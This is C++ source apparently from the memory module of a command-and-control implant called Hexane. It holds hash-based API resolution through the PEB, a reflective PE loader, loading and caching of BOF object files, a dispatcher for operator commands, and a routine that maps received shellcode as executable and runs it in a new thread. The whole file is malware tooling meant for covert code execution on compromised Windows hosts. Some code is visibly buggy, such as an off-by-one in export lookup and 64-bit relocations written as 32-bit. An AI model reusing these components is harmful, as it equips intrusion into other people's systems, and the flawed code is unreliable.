#include <core/include/memory.hpp>

using namespace Opsec;
using namespace Utils;
using namespace Parser;
using namespace Objects;
using namespace Threads;
using namespace Commands;

namespace Memory {
    namespace Methods {

        UINT_PTR GetStackCookie() {
            HEXANE;

            UINT_PTR cookie = 0;
            if (!NT_SUCCESS(ntstatus = ctx->procapi.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
                return 0;
            }

            return cookie;
        }

        PRESOURCE GetIntResource(HMODULE base, CONST INT rsrc_id) {
            HEXANE;

            HRSRC rsrc_info		= { };
            PRESOURCE object	= (RESOURCE*) Malloc(sizeof(_resource));

            x_assert(rsrc_info          = ctx->utilapi.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global   = ctx->utilapi.LoadResource(base, rsrc_info));
            x_assert(object->size       = ctx->utilapi.SizeofResource(base, rsrc_info));
            x_assert(object->rsrc_lock  = ctx->utilapi.LockResource(object->h_global));

        defer:
            return object;
        }

        PEXECUTABLE CreateImage(uint8 *data) {
            HEXANE;

            auto image = (EXECUTABLE*) Malloc(sizeof(_executable));

            image->buffer   = data;
            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(image->buffer) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
            image->symbols  = (PCOFF_SYMBOL) (B_PTR(image->buffer) + image->nt_head->FileHeader.PointerToSymbolTable);
            image->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(image->buffer) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            return image;
        }
    }

    namespace Context {

        BOOL ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
        	HEXANE;

            _hexane instance    = { };
            VOID *region        = { };

            instance.teb    = NtCurrentTeb();
            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            if (!(instance.modules.ntdll = (HMODULE) M_PTR(NTDLL))) {
                return FALSE;
            }

            F_PTR_HMOD(instance.memapi.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
            if (!instance.memapi.RtlAllocateHeap) {
                return FALSE;
            }

            region = RVA(PBYTE, instance.base.address, &__instance);
            if (!(C_DREF(region) = instance.memapi.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                return FALSE;
            }

            MemCopy(C_DREF(region), &instance, sizeof(_hexane));
            MemSet(&instance, 0, sizeof(_hexane));
            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);

            return TRUE;
        }

        VOID ContextDestroy() {
            HEXANE;
            // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = ctx->memapi.RtlFreeHeap;
            auto heap = ctx->heap;

            // free coff executables
            for (auto head = ctx->bof_cache; head; head = head->next) {
                RemoveCoff(head->bof_id);
            }

            if (free) {
                free(heap, 0, ctx);
            }
        }
    }

    namespace Modules {
	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(CONST UINT32 hash) {
		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

		    for (auto next = head->Flink; next != head; next = next->Flink) {
			    const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			    const auto name = mod->BaseDllName;

			    wchar_t buffer[MAX_PATH] = { };

			    if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
				    return mod;
			    }
		    }

		    return nullptr;
	    }

	    FARPROC GetExportAddress(CONST VOID *base, CONST UINT32 hash) {
		    FARPROC address = nullptr;

		    const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
		    const auto exports = (PIMAGE_EXPORT_DIRECTORY) (
			    B_PTR(base) + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

		    if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
			    return address;
		    }

		    for (auto index = 0; index < exports->NumberOfNames; index++) {
			    const auto name = (char *) (base + ((uint32_t *) (base + exports->AddressOfNames))[index - 1]);

			    char buffer[MAX_PATH] = {};

			    if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
				    address = (FARPROC) (base + ((uint32_t *) (base + exports->AddressOfFunctions))[index]);
				    break;
			    }
		    }

		    return address;
	    }

	    UINT_PTR LoadExport(CONST CHAR *module_name, CONST CHAR *export_name) {
		    HEXANE;

		    uintptr_t symbol = 0;
		    bool reload = FALSE;

		    char buffer[MAX_PATH] = {};

		    const auto mod_hash = HashStringA(MbsToLower(buffer, module_name), MbsLength(module_name));
		    const auto fn_hash = HashStringA(MbsToLower(buffer, export_name), MbsLength(export_name));

		    while (!symbol) {
			    F_PTR_HASHES(symbol, mod_hash, fn_hash);

			    if (!symbol) {
				    if (reload || !ctx->memapi.LoadLibraryA((const char *) module_name)) {
					    // this is sus...
					    goto defer;
				    }
				    reload = TRUE;
			    }
		    }

	    defer:
		    return symbol;
	    }

	    BOOL FindModule(EXECUTABLE *module, WCHAR *filename) {
	    	HEXANE;

		    if (!filename) {
			    return FALSE;
		    }

		    module->local_name		= filename;
		    module->cracked_name	= (PWCHAR) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, MAX_PATH * 2);

		    if (!module->cracked_name) {
			    return FALSE;
		    }

		    CONST WCHAR *location = ctx->ioapi.PathFindFileNameW(filename);
		    MemCopy(module->cracked_name, location, (WcsLength(location) % (MAX_PATH - 1)) * 2);

		    return TRUE;
	    }

	    BOOL ReadModule(PEXECUTABLE module) {
	    	HEXANE;

		    HANDLE handle = ctx->ioapi.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
		    if (handle == INVALID_HANDLE_VALUE) {
			    return FALSE;
		    }

		    DWORD size = ctx->ioapi.GetFileSize(handle, nullptr);
		    if (size == INVALID_FILE_SIZE) {
			    ctx->utilapi.NtClose(handle);
			    return FALSE;
		    }

		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, size, (PSIZE_T) &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
			    ctx->utilapi.NtClose(handle);
			    return FALSE;
		    }

		    if (!ctx->ioapi.ReadFile(handle, module->buffer, size, (LPDWORD) &module->size, nullptr)) {
		    	ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, &module->size, 0);
			    ctx->utilapi.NtClose(handle);
			    return FALSE;
		    }

		    ctx->utilapi.NtClose(handle);
		    return TRUE;
	    }

	    BOOL MapSections(PEXECUTABLE module) {
		    HEXANE;

		    auto region_size		= (SIZE_T)module->nt_head->OptionalHeader.SizeOfImage;
		    const auto pre_base		= module->nt_head->OptionalHeader.ImageBase;

		    module->base = pre_base;

		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
			    module->base != pre_base) {

			    module->base	= 0;
			    region_size		= module->nt_head->OptionalHeader.SizeOfImage;

			    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
				    return false;
			    }
		    }

		    for (auto i = 0; i < module->nt_head->OptionalHeader.SizeOfHeaders; i++) {
			    B_PTR(module->base)[i] = module->buffer[i];
		    }

		    for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
			    for (auto j = 0; j < module->section->SizeOfRawData; j++) {
				    (B_PTR(module->base + module->section->VirtualAddress))[j] = (module->buffer + module->section->PointerToRawData)[j];
			    }
		    }

		    UINT_PTR base_offset = module->base - pre_base;
		    PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		    // if non-zero rva and relocdir exists...
		    if ((module->base - pre_base) && relocdir) {
			    PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);

			    do {
				    PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY)reloc + 1;

				    do {
					    switch (head->Type) {
					    case IMAGE_REL_BASED_DIR64:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
					    case IMAGE_REL_BASED_HIGHLOW:	*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_offset; break;
					    case IMAGE_REL_BASED_HIGH:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
					    case IMAGE_REL_BASED_LOW:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
					    }
					    head++;
				    }
				    while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);

				    reloc = (PIMAGE_BASE_RELOCATION)head;
			    }
			    while (reloc->VirtualAddress);
		    }

		    module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
		    return true;
	    }

	    PEXECUTABLE LoadModule(CONST UINT32 load_type, WCHAR *filename, UINT8 *memory, CONST UINT32 mem_size, WCHAR *name) {
	    	// NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
	    	// TODO: see if this can be used on bofs
	    	HEXANE;

		    auto module = (EXECUTABLE*) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
		    if (!module) {
			    return nullptr;
		    }

		    module->success	= FALSE;
		    module->link	= TRUE;

		    switch (LOWORD(load_type)) {
		    	case LoadLocalFile:
				    if (!FindModule(module, filename) || !ReadModule(module)) {
					    goto defer;
				    }
				    break;

			    case LoadMemory:
				    module->size			= mem_size;
				    module->buffer			= memory;
				    module->cracked_name	= name;
				    module->local_name		= name;

				    if (name == nullptr) {
					    goto defer;
				    }
				    break;

			    default:
				    break;
		    }

		    if (load_type & NoLink)
			    module->link = FALSE;

		    if (name == nullptr) {
			    name = module->cracked_name;
		    }

	    	if ((load_type & LoadBof) != LoadBof) {
			    if (PLDR_DATA_TABLE_ENTRY check_module = GetModuleEntry(HashStringW(name, WcsLength(name)))) {
				    module->base = (ULONG_PTR) check_module->DllBase;
				    module->success = TRUE;

				    goto defer;
			    }
	    	}

	    	auto image = Methods::CreateImage(module->buffer);
		    if (!ImageCheckArch(image)) {
		    	goto defer;
		    }

	    	// DestroyImage(module);
	    	Free(image);

		    // map the sections into memory
		    if (!MapSections(module) || !ResolveImports(module)) {
			    goto defer;
		    }

		    if (module->link) {
			    if (!LinkModuleToPEB(module)) {
				    goto defer;
			    }
		    }

		    // trigger tls callbacks, set permissions and call the entry point
		    if (!BeginExecution(module)) {
			    goto defer;
		    }

		    module->success = TRUE;

	    defer:
		    return module;
	    }


	    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
		    return FALSE;
	    }
    }

    namespace Execute {

        BOOL ExecuteCommand(_parser parser) {
            HEXANE;

            uintptr_t pointer = 0;

            const auto cmd_id = UnpackUint32(&parser);
            if (cmd_id == NOJOB) {
                return TRUE;
            }

            if (!(pointer = GetCommandAddress(cmd_id))) {
                // LOG ERROR
                return FALSE;
            }

            const auto cmd = (COMMAND) RVA(PBYTE, ctx->base.address, pointer);
            cmd(&parser);

            return TRUE;
        }

        BOOL ExecuteShellcode(CONST PARSER &parser) {
            HEXANE;

            VOID* base      = nullptr;
            VOID (*exec)()  = nullptr;

            BOOL success = TRUE;
            size_t size = parser.length;

            if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                // LOG ERROR
                success = FALSE;
                goto defer;
            }

            MemCopy(base, parser.buffer, parser.length);

            if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                // LOG ERROR
                success = FALSE;
                goto defer;
            }

            exec = (void(*)()) base;
            ctx->threadapi.NtCreateThreadEx(nullptr, 0, (LPTHREAD_START_ROUTINE) exec, nullptr, 0, nullptr);

            MemSet(base, 0, size);

        defer:
            if (base) {
                ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
            }

            return success;
        }

        VOID LoadObject(_parser parser) {
            HEXANE;

            PCOFF_PARAMS coff  = (_coff_params*) Malloc(sizeof(_coff_params));
            PCOFF_PARAMS saved = nullptr;

            coff->entrypoint    = UnpackString(&parser, (UINT32*) &coff->entrypoint_length);
            coff->data          = UnpackBytes(&parser, (UINT32*) &coff->data_size);
            coff->args          = UnpackBytes(&parser, (UINT32*) &coff->args_size);
            coff->b_cache       = UnpackByte(&parser);
            coff->bof_id		= UnpackUint32(&parser);
            coff->task_id       = ctx->session.current_taskid;

            // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
            // TODO: test that coff data size being zero is a correct way to do this

            if (!coff->data_size) {
                saved = GetCoff(coff->bof_id);

                coff->data      = saved->data;
                coff->data_size = saved->data_size;
            }

            if (!CreateUserThread(NtCurrentProcess(), (VOID*) CoffThread, coff, nullptr)) {
                // LOG ERROR
                // do not return
            }

            if (!saved) {
                AddCoff(coff);
            }

            // NOTE: keep original task_id after every run or update (?)
            // NOTE: operator now has the option to remove a BOF any time with b_cache (FALSE == "remove")
            // TODO: server should keep BOF information stored locally for this

            if (!coff->b_cache) {
                RemoveCoff(coff->bof_id);
            }
        }
    }
}
